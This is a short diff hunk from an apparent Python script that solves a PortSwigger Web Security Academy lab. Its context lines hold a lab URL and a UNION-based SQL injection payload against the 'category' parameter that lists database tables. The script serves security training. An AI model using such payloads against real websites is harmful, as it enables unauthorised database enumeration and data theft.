@@ -29,7 +29,9 @@ import re
 #########
 # change this to your lab URL
 url = "https://0ad1004d03a4757c87eae8ac003400d0.web-security-academy.net"
+
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
+
 try:
     # payload to retreive the name of users table
     payload = "' union SELECT table_name, null from all_tables-- -"
